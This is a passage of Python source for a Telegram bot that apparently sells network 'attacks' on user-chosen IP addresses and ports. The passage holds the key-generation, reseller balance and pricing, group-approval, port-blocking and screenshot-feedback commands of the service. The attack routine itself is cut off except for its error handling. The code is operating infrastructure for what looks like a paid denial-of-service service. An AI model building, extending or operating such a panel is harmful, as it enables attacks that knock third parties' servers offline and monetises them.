                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        print(f"Attack error: {e}")
        traceback.print_exc()
        
# ============ GLOBAL VARIABLES ============
active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
_attack_lock = threading.Lock()

# ====================================================================================================

# ============ TELEGRAM COMMANDS ============

@bot.message_handler(commands=["check"])
def check_channel_command(message):
    user_id = message.from_user.id
    
    if is_user_joined_channel(user_id):
        safe_send_message(message.chat.id, "✅ You have joined the channel! You can use all commands.", reply_to=message)
    else:
        safe_send_message(message.chat.id, 
            f"❌ You haven't joined the channel yet!\n\n"
            f"Please join: {CHANNEL_LINK}", 
            reply_to=message)
            
@bot.message_handler(commands=["id"])
def id_command(message):
    if not check_channel_and_continue(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"{user_id}", reply_to=message, parse_mode="Markdown")

@bot.message_handler(content_types=['video'])
def auto_save_video(message):
    """Automatic video save - bas video bhejo, apne aap save ho jayegi"""
    user_id = message.from_user.id
    video_id = message.video.file_id
    
    # Save video ID
    save_video_id(video_id)
    
    # Confirm to user
    bot.reply_to(message, 
        f"✅ **Video Updated Successfully!**\n\n"
        f"🎬 New Video ID saved.\n\n"
        f"⚡ Ab se attacks mein yehi video use hogi!",
        parse_mode="Markdown")
    
    # Owner ko bhi notify karo
    try:
        bot.send_message(BOT_OWNER, 
            f"📹 **Video Updated by User**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"🎬 New Video ID: `{video_id}`",
            parse_mode="Markdown")
    except:
        pass
    
    print(f"📹 Auto-saved new video from user {user_id}")

@bot.message_handler(commands=["current_video"])
def check_current_video(message):
    """Dekho kaunsi video save hai"""
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    current_id = load_video_id()
    safe_send_message(message.chat.id, 
        f"📹 **Current Video ID**\n\n"
        f"`{current_id}`\n\n"
        f"Send a new video to change it.",
        reply_to=message, parse_mode="Markdown")
            
@bot.message_handler(commands=["ping"])
def ping_command(message):
    if not check_channel_and_continue(message): return
    start_time = datetime.now()
    total_users = len(users_db)
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)
    
@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 3:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5", reply_to=message)
            return
        
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        
        if not duration:
            safe_send_message(message.chat.id, "❌ Invalid format! Use: s/m/h/d", reply_to=message)
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 50:
                safe_send_message(message.chat.id, "❌ Count must be between 1-50!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        generated_keys = []
        for _ in range(count):
            key = f"DAEMON-{generate_key(12)}"
            keys_db[key] = {
                'key': key,
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        
        save_keys(keys_db)  # ✅ SAVE
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
            return
        
        command_parts = message.text.split()
        if len(command_parts) != 3:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5", reply_to=message)
            return
        
        duration_key = command_parts[1].lower()
        
        if duration_key not in RESELLER_PRICING:
            safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            safe_send_message(message.chat.id, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nAdd balance from owner!", reply_to=message)
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(10)}"
            keys_db[key] = {
                'key': key,
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        
        new_balance = balance - total_price
        resellers_db[user_id]['balance'] = new_balance
        resellers_db[user_id]['total_keys_generated'] = resellers_db[user_id].get('total_keys_generated', 0) + count

        save_keys(keys_db)  # ✅ SAVE
        save_resellers(resellers_db)  # ✅ SAVE

        try:
            keys_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            owner_msg = (
                "🔔 <b>Reseller Key Notification</b>\n\n"
                f"👤 <b>Reseller:</b> {username} ({user_id})\n"
                f"🔑 <b>Keys Generated:</b> {count}\n"
                f"⏰ <b>Duration:</b> {pricing['label']}\n"
                f"💵 <b>Total Cost:</b> {total_price} Rs\n"
                f"💰 <b>Remaining Balance:</b> {new_balance} Rs\n\n"
                f"📜 <b>Keys:</b>\n{keys_list_str}"
            )
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except:
            pass
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
    
    else:
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/reseller!", reply_to=message)

# ============ CALLBACK QUERY HANDLER FOR FEEDBACK ============
@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('reject_'))
def handle_feedback_callback(call):
    """Owner ke approve/reject button handle karo"""
    user_id = int(call.data.split('_')[1])
    
    if call.data.startswith('approve_'):
        if approve_attack(user_id):
            bot.answer_callback_query(call.id, "✅ Attack approved! User can now attack again.")
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
            except:
                pass
            
            pending = pending_approvals.get(user_id, {})
            if FEEDBACK_GROUP_ID:
                try:
                    group_msg = f"""✅ **ATTACK APPROVED!**

👤 **User:** {pending.get('username', 'Unknown')}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{pending.get('target', 'N/A')}:{pending.get('port', 'N/A')}`
⏱️ **Duration:** `{pending.get('duration', 'N/A')}s`

✅ Attack has been approved by owner!"""
                    bot.send_message(FEEDBACK_GROUP_ID, group_msg, parse_mode="Markdown")
                except:
                    pass
            
            try:
                bot.send_message(user_id, "✅ **Attack Approved!**\n\nYou can now start another attack!\n\nUse `/chodo` to start a new attack.", parse_mode="Markdown")
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ Failed to approve!")
    
    elif call.data.startswith('reject_'):
        if reject_attack(user_id):
            bot.answer_callback_query(call.id, "❌ Attack rejected!")
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
            except:
                pass
            
            pending = pending_approvals.get(user_id, {})
            if FEEDBACK_GROUP_ID:
                try:
                    group_msg = f"""❌ **ATTACK REJECTED!**

👤 **User:** {pending.get('username', 'Unknown')}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{pending.get('target', 'N/A')}:{pending.get('port', 'N/A')}`
⏱️ **Duration:** `{pending.get('duration', 'N/A')}s`

❌ Attack rejected! User needs valid feedback."""
                    bot.send_message(FEEDBACK_GROUP_ID, group_msg, parse_mode="Markdown")
                except:
                    pass
            
            try:
                bot.send_message(user_id, "❌ **Attack Rejected!**\n\nPlease provide valid screenshot and try again.", parse_mode="Markdown")
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ Failed to reject!")
# ============ PHOTO HANDLER FOR FEEDBACK ============
@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    """User se photo feedback handle karo - AUTO APPROVE with group mention"""
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or str(user_id)
    
    # Check if user has pending approval
    if user_id not in pending_approvals or pending_approvals[user_id].get('status') != 'pending':
        safe_send_message(message.chat.id, "📸 No pending approval request found!", reply_to=message)
        return
    
    pending = pending_approvals[user_id]
    
    # AUTO APPROVE - instantly approve the attack
    approve_attack(user_id)
    
    # Send confirmation to user
    safe_send_message(message.chat.id, 
        "✅ **Feedback Received & Auto-Approved!**\n\n"
        "🎉 Thank you for your feedback!\n\n"
        f"⏳ Your cooldown: {get_user_cooldown(user_id)}s remaining.\n"
        "⚡ You can start a new attack after cooldown ends!\n\n"
        "Use `/chodo` to start a new attack.",
        reply_to=message, parse_mode="Markdown")
    
    # ============ FORWARD TO GROUP WITH USER TAG ============
    try:
        # Create user mention
        user_mention = f"[{pending.get('username', username)}](tg://user?id={user_id})"
        
        group_caption = f"""
📸 **ATTACK FEEDBACK RECEIVED & AUTO-APPROVED**

👤 **User:** {user_mention}
🆔 **ID:** `{user_id}`
🎯 **Target:** `{pending.get('target', 'N/A')}:{pending.get('port', 'N/A')}`
⏱️ **Duration:** `{pending.get('duration', 'N/A')}s`
🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ **Auto-Approved!** User can attack after cooldown.
"""
        
        if FEEDBACK_GROUP_ID:
            bot.send_photo(
                FEEDBACK_GROUP_ID, 
                message.photo[-1].file_id, 
                caption=group_caption, 
                parse_mode="Markdown"
            )
            print(f"✅ Photo forwarded to group with user tag")
    except Exception as e:
        print(f"Error forwarding to group: {e}")
    
    # Optional: Notify owner bot
    try:
        owner_bot = telebot.TeleBot(OWNER_BOT_TOKEN)
        owner_bot.send_message(OWNER_BOT_CHAT_ID, 
            f"📸 **Feedback Auto-Approved**\n\n"
            f"👤 User: {pending.get('username', username)}\n"
            f"🆔 ID: `{user_id}`\n"
            f"🎯 Target: `{pending.get('target')}:{pending.get('port')}`\n"
            f"⏱️ Duration: `{pending.get('duration')}s`\n\n"
            f"✅ Auto-approved! No action needed.")
    except:
        pass
            
@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found! Ask them to use /id command first.", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    resellers_db[reseller_id] = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    save_resellers(resellers_db)  # ✅ SAVE
    
    try:
        bot.send_message(reseller_id, "🎉 Congratulations! You are now a Reseller!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs", reply_to=message)

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        del resellers_db[reseller_id]
        save_resellers(resellers_db)  # ✅ SAVE
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"✅ Reseller {display} removed!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        resellers_db[reseller_id]['blocked'] = True
        save_resellers(resellers_db)  # ✅ SAVE
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"🚫 Reseller {display} blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        resellers_db[reseller_id]['blocked'] = False
        save_resellers(resellers_db)  # ✅ SAVE
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"✅ Reseller {display} unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not resellers_db:
        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "👥 RESELLER LIST\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers_db.values() if not r.get('blocked')]
    blocked_resellers = [r for r in resellers_db.values() if r.get('blocked')]
    
    response += f"🟢 ACTIVE: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 {r['user_id']}\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"🔴 BLOCKED: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 {r['user_id']}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["block_port"])
def block_port_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_port <port>", reply_to=message)
        return
    
    try:
        port = int(args[1])
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid port number!", reply_to=message)
        return
    
    if add_blocked_port(port):
        safe_send_message(message.chat.id, f"✅ Port {port} has been blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"❌ Port {port} is already blocked!", reply_to=message)

@bot.message_handler(commands=["unblock_port"])
def unblock_port_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_port <port>", reply_to=message)
        return
    
    try:
        port = int(args[1])
    except:
        safe_send_message(message.chat.id, "❌ Invalid port number!", reply_to=message)
        return
    
    if remove_blocked_port(port):
        safe_send_message(message.chat.id, f"✅ Port {port} has been unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"❌ Port {port} is not in blocked list!", reply_to=message)

@bot.message_handler(commands=["blocked_ports"])
def blocked_ports_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    blocked = get_blocked_ports()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No ports are blocked!", reply_to=message)
        return
    
    response = "🚫 **BLOCKED PORTS**\n\n"
    response += f"Total: {len(blocked)} ports\n\n"
    
    # Show ports in groups of 10
    for i in range(0, len(blocked), 10):
        response += ", ".join(map(str, blocked[i:i+10])) + "\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_add <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, "❌ Amount must be positive!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = resellers_db[reseller_id].get('balance', 0) + amount
    resellers_db[reseller_id]['balance'] = new_balance
    save_resellers(resellers_db)  # ✅ SAVE
    
    try:
        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_remove <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = max(0, resellers_db[reseller_id].get('balance', 0) - amount)
    resellers_db[reseller_id]['balance'] = new_balance
    save_resellers(resellers_db)  # ✅ SAVE
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

# ============ VERIFICATION COMMANDS ============
@bot.message_handler(commands=["verify"])
def verify_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /verify <user_id>", reply_to=message)
        return
    
    try:
        target_id = int(args[1])
        verified_users.add(target_id)
        save_verified_users(verified_users)
        safe_send_message(message.chat.id, f"✅ User `{target_id}` verified successfully!", reply_to=message, parse_mode="Markdown")
        
        # Notify user
        try:
            bot.send_message(target_id, "🎉 **You have been verified!**\n\nYou can now use all bot commands.\n\nUse /help to see available commands.", parse_mode="Markdown")
        except:
            pass
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["unverify"])
def unverify_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unverify <user_id>", reply_to=message)
        return
    
    try:
        target_id = int(args[1])
        if target_id in verified_users:
            verified_users.remove(target_id)
            save_verified_users(verified_users)
            safe_send_message(message.chat.id, f"✅ User `{target_id}` unverified!", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, f"❌ User `{target_id}` is not verified!", reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["list_verified"])
def list_verified_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    if not verified_users:
        safe_send_message(message.chat.id, "📋 No verified users!", reply_to=message)
        return
    
    response = "✅ **VERIFIED USERS**\n\n"
    for uid in list(verified_users)[:30]:
        response += f"• `{uid}`\n"
    
    if len(verified_users) > 30:
        response += f"\n... and {len(verified_users) - 30} more"
    
    response += f"\n\n📊 Total: {len(verified_users)}"
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["test_channel"])
def test_channel_command(message):
    user_id = message.from_user.id
    try:
        chat_member = bot.get_chat_member(-1003715890089, user_id)
        status = chat_member.status
        safe_send_message(message.chat.id, 
            f"🔍 **Channel Check Result**\n\n"
            f"Your Status: `{status}`\n\n"
            f"✅ If status = member/creator/administrator → You are in channel\n"
            f"❌ If status = left → You are NOT in channel",
            reply_to=message, parse_mode="Markdown")
    except Exception as e:
        safe_send_message(message.chat.id, 
            f"❌ **Error:** {str(e)[:200]}\n\n"
            f"⚠️ Make sure bot is admin in the channel!",
            reply_to=message)
    
@bot.message_handler(commands=["approve_group"])
def approve_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Only owner can approve groups!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /approve_group <group_id>\n\nExample: /approve_group -1001234567890", reply_to=message)
        return
    
    try:
        group_id = int(command_parts[1])
        approved_groups.add(group_id)
        save_approved_groups()
        safe_send_message(message.chat.id, f"✅ Group {group_id} approved!\n\nNow members can attack in this group without key.", reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid group ID!", reply_to=message)

@bot.message_handler(commands=["remove_group"])
def remove_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Only owner can remove groups!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_group <group_id>", reply_to=message)
        return
    
    try:
        group_id = int(command_parts[1])
        if group_id in approved_groups:
            approved_groups.remove(group_id)
            save_approved_groups()
            safe_send_message(message.chat.id, f"✅ Group {group_id} removed from approved list!", reply_to=message, parse_mode="Markdown")
        else:
            safe_send_message(message.chat.id, f"❌ Group {group_id} is not in approved list!", reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid group ID!", reply_to=message)

@bot.message_handler(commands=["approved_groups"])
def approved_groups_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Only owner can view approved groups!", reply_to=message)
        return
    
    if not approved_groups:
        safe_send_message(message.chat.id, "📋 No approved groups yet!\n\nUse /approve_group <group_id> to add.", reply_to=message)
        return
    
    response = "✅ APPROVED GROUPS\n\n"
    for gid in approved_groups:
        response += f"• {gid}\n"
    response += f"\n📊 Total: {len(approved_groups)}"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["request_access"])
def request_access_command(message):
    """User can request group access from owner"""
    if not is_group_chat(message):
        safe_send_message(message.chat.id, "❌ This command only works in groups!", reply_to=message)
        return
    
    group_id = message.chat.id
    group_name = message.chat.title or str(group_id)
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    
    if group_id in approved_groups:
        safe_send_message(message.chat.id, "✅ This group is already approved! You can use /chodo command.", reply_to=message)
        return
    
    # Send request to owner
    owner_msg = f"📢 GROUP ACCESS REQUEST\n\n"
    owner_msg += f"👥 Group: {group_name}\n"
    owner_msg += f"🆔 Group ID: {group_id}\n"
    owner_msg += f"👤 Requested by: {user_name} ({user_id})\n\n"
    owner_msg += f"To approve: /approve_group {group_id}"
    
    try:
        bot.send_message(BOT_OWNER, owner_msg, parse_mode="Markdown")
        safe_send_message(message.chat.id, "✅ Request sent to owner! They will approve the group soon.", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Failed to send request. Contact owner directly.", reply_to=message)

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    reseller = resellers_db[reseller_id]
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}", reply_to=message)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        response = "═══════════════════════════\n"
        response += "💵 CURRENT PRICING\n"
        response += "═══════════════════════════\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\n⚠️ Usage: /setprice <duration> <price>\n"
        response += "Example: /setprice 1d 60\n"
        response += "═══════════════════════════"
        safe_send_message(message.chat.id, response, reply_to=message)
        return
    
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /setprice <duration> <price>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: /setprice 1d 60", reply_to=message)
        return
    
    duration_key = command_parts[1].lower()
    
    if duration_key not in RESELLER_PRICING:
